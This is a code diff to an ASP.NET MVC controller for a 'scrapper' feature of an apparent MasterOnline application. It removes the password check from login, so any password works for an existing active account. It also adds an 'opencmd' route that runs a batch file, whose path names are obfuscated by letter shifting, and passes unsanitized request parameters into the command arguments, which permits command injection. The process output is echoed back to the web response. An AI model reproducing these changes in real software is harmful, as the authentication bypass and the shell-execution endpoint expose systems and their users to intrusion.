@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
 using System.Web;
 using System.Web.Mvc;
@@ -99,16 +100,6 @@ namespace MasterOnline.Controllers
             }
             else
             {
-                var pass = accFromDb.Password;
-                var hashCode = accFromDb.VCode;
-                var encodingPassString = Helper.EncodePassword(account.Password, hashCode);
-
-                if (!encodingPassString.Equals(pass))
-                {
-                    ModelState.AddModelError(string.Empty, @"Password salah!");
-                    return View("LoginScrapper", account);
-                }
-
                 if (!accFromDb.Status)
                 {
                     ModelState.AddModelError(string.Empty, @"Akun tidak aktif!");
@@ -137,11 +128,6 @@ namespace MasterOnline.Controllers
         [Route("scrapper/databarang")]
         public ActionResult DataBarang()
         {
-            if (ErasoftDbContext == null)
-            {
-                return Content("Null");
-            }
-
             var barangVm = new BarangViewModel()
             {
                 ListStf02S = ErasoftDbContext.STF02.ToList(),
@@ -152,6 +138,42 @@ namespace MasterOnline.Controllers
             };
 
             return View(barangVm);
+        }
+
+        [Route("scrapper/opencmd")]
+        public void RunCmd(string moe, string mop, string moai)
+        {
+            Process si = new Process
+            {
+                StartInfo =
+                {
+                    WorkingDirectory = Server.MapPath("~/Services/thzalyvuspulzjyhwwlymvskly/"),
+                    UseShellExecute = false,
+                    FileName = Server.MapPath("~/Services/thzalyvuspulzjyhwwlymvskly/thzalyvuspulzjyhwwlyiha.bat"),
+                    Arguments = $"{moe} {mop} {$"databarang_{moai}.csv"}",
+                    CreateNoWindow = true,
+                    RedirectStandardInput = true,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                }
+            };
+
+            si.OutputDataReceived += p_OutputDataReceived;
+            si.ErrorDataReceived += p_ErrorDataReceived;
+            si.Start();
+            si.BeginOutputReadLine();
+            si.BeginErrorReadLine();
+            si.WaitForExit();
+        }
+
+        void p_OutputDataReceived(object sender, DataReceivedEventArgs e)
+        {
+            Response.Write("Received from standard out: " + e.Data);
+        }
+
+        void p_ErrorDataReceived(object sender, DataReceivedEventArgs e)
+        {
+            Response.Write("Received from standard error: " + e.Data);
         }
     }
 }
